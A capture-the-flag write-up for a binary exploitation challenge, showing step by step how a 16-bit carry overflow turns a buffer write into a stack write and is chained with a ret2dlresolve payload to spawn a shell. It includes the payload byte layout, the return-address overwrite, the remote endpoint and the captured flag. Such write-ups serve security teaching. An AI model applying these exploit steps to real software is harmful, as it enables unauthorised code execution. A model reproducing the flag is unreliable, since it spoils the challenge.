# common_offset

| Field | Value |
|-------|-------|
| Platform | srdnlenIT2026 |
| Category | pwn |
| Difficulty | Medium-Hard |
| Remote | `nc common-offset.challs.srdnlen.it 1089` |

## Description
> I had an idea: what if we could treat some files as time series? Imagine if when you wrote to a file at a certain offset, that offset was maintained even when you wrote to another file. We'd have a perfect time log of when you wrote what to the files...

## TL;DR
16-bit integer overflow in shared offset counter causes carry into the buffer index byte, allowing OOB access to a stack pointer. This enables a stack write overriding the return address. Combined with a ret2dlresolve payload planted in BSS via the normal buffer write, we resolve and call `system("sh")`.

## Initial Analysis

```
common_offset: ELF 64-bit LSB executable, x86-64, dynamically linked
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Binary has functions: `main`, `change_files`, `write_chars`, `read_stdin`, `get_number`, `panic`, `init`.

### Program flow:
1. `main()`: reads 8-byte name (alphanumeric only via strspn), calls `change_files(name)`
2. `change_files()`: sets up 4 buffer pointers (`local_ptrs[0..3]` → `buffers[0..3]` at 0x4040a0), a shared offset+index stored as 2 bytes (treated as 16-bit), allows exactly 2 write operations
3. Each write: user picks index (0-3), picks offset increment, writes data via `fgets(buf[idx]+offset, 32-offset, stdin)`
4. After writes: checks `exit_flag`, sets it to 1, prints "Goodbye", restores `rdi = name_ptr`, returns

## Vulnerability Identified

### 16-bit integer overflow (CWE-190)

The offset increment uses a 16-bit add on the `(var_48h, var_49h)` pair:
```asm
0x40144d: movzx ecx, word [rdx]     ; load 16-bit: (var_49h << 8) | var_48h
0x401450: movzx edx, al             ; offset_inc from user
0x40145c: add   edx, ecx            ; 16-bit add!
0x40145e: mov   word [rax], dx      ; store back 16 bits
0x401461: movzx eax, byte [var_48h] ; check ONLY low byte (offset)
0x401466: cmp   al, 0x1f            ; offset <= 31?
```

Only `var_48h` (low byte = offset) is bounds-checked. If the addition overflows from 255→256+, the carry propagates into `var_49h` (high byte = index), modifying it without validation.

### OOB index → stack pointer dereference

When `var_49h` becomes 4 (via carry from index 3), `write_chars` reads `ptrs_base[4]`, which is `shared_end_ptr` — a pointer to `var_49h` on the **stack**. This turns a buffer write into a **stack write**.

## Stack Layout

```
cf.rsp+0x08: name pointer
cf.rsp+0x10: num_files counter
cf.rsp+0x18: local_ptrs[0] → &buffers[0] (0x4040a0)
cf.rsp+0x20: local_ptrs[1] → &buffers[1] (0x4040c0)
cf.rsp+0x28: local_ptrs[2] → &buffers[2] (0x4040e0)
cf.rsp+0x30: local_ptrs[3] → &buffers[3] (0x404100)
cf.rsp+0x38: shared_end_ptr → &var_49h        ← ptrs_base[4]!
cf.rsp+0x40: shared_offset_ptr → &var_48h
cf.rsp+0x48: var_48h (offset byte)
cf.rsp+0x49: var_49h (index byte)
cf.rsp+0x4a-0x57: padding
cf.rsp+0x58: RETURN ADDRESS
cf.rsp+0x60: (next qword on stack)
```

## Solution Steps

### Step 1: Trigger the overflow

**Round 1** (idx=0, offset_inc=1):
- Writes to `buffers[0]+1`, 30 bytes of dlresolve payload + null terminator
- After: `var_48h=1, var_49h=0`

**Round 2** (idx=3, offset_inc=255):
- 16-bit add: `(0<<8|1) + 255 = 256 = 0x0100`
- `var_48h = 0x00` (offset = 0, passes `<= 0x1f` check)
- `var_49h = 0x04` (index = 4, OOB!)
- `ptrs_base[4] = shared_end_ptr = &var_49h` (stack address)
- Writes 31 bytes starting at `var_49h`, covering the return address

### Step 2: ret2dlresolve payload in BSS

The entire ret2dlresolve fake structure set fits within a single 30-byte buffer write:

```
0x4040a0: 0x00         (BSS zero, untouched)
0x4040a1: "system\0"   (7 bytes: function name string)
0x4040a8: Elf64_Rela   (r_offset=0x404120, r_info=(646<<32)|7)
0x4040b8: Elf64_Sym    (st_name=0x3b41, st_info=0x12, rest=0)
          (overlaps Rela.r_addend — ignored for R_X86_64_JUMP_SLOT)
0x4040c0: Sym.st_value + st_size = 0 (BSS zeros, no write needed)
```

Structure alignment:
- Rela at 0x4040a8: `(0x4040a8 - JMPREL) / 24 = 617` → `reloc_index = 617`
- Sym at 0x4040b8: `(0x4040b8 - SYMTAB) / 24 = 646` → `sym_index = 646`
- String: `st_name = 0x4040a1 - STRTAB = 0x3b41`

Key trick: `r_addend` and `Elf64_Sym` overlap at 0x4040b8. Since `_dl_fixup` ignores `r_addend` for `JUMP_SLOT` relocations, this overlap is safe.

### Step 3: Stack overwrite ROP

The 31-byte stack write overwrites:
```
bytes  0-14: padding (15 bytes)
bytes 15-22: return address → PLT0 (0x401020)
bytes 23-30: reloc_index = 617 (for _dl_runtime_resolve)
```

### Step 4: Automatic rdi setup

The `change_files` epilogue at 0x4014e0-0x4014ed:
```asm
mov rax, [rsp+0x08]    ; rax = name pointer
mov rdi, rax           ; rdi = &"sh"
nop
add rsp, 0x58
ret                    ; → PLT0 → resolve "system" → system("sh")
```

Since our name is `"sh"` (alphanumeric, passes `strspn` validation), `rdi` already points to `"sh"` when `system()` is called. `_dl_runtime_resolve` preserves all argument registers, so no gadgets are needed to set up rdi.

## Exploit Script

See `solve.py`. Single-shot exploit:
1. Name = "sh"
2. Round 1: write dlresolve structures to buffers[0]
3. Round 2: overflow to overwrite return address → PLT0 + reloc_index

```bash
python3 solve.py           # Local
python3 solve.py REMOTE    # Remote
python3 solve.py GDB       # Debug
```

## Flag
```
srdnlen{DL-r35m4LLv3}
```

## Key Lessons
- 16-bit integer arithmetic on adjacent byte fields can create carry-based overflow into unvalidated bytes
- When an OOB index reads a stack pointer, buffer writes become stack writes
- ret2dlresolve works even on glibc 2.42 when the binary has Partial RELRO and no PIE
- `r_addend` is ignored for `R_X86_64_JUMP_SLOT`, allowing Rela/Sym structure overlap to save space
- Function epilogues that restore argument registers (rdi) before returning are a gift for exploitation — no `pop rdi; ret` gadget needed
- The flag name "DL-r35m4LLv3" (DL resolve) confirms ret2dlresolve was the intended approach

## Files

```
pwn/common_offset/
├── common_offset   # Binary
├── libc.so.6       # Provided libc
├── solve.py        # Full exploit (LOCAL/REMOTE/GDB)
├── flag.txt        # Captured flag
└── solution.md     # This writeup
```
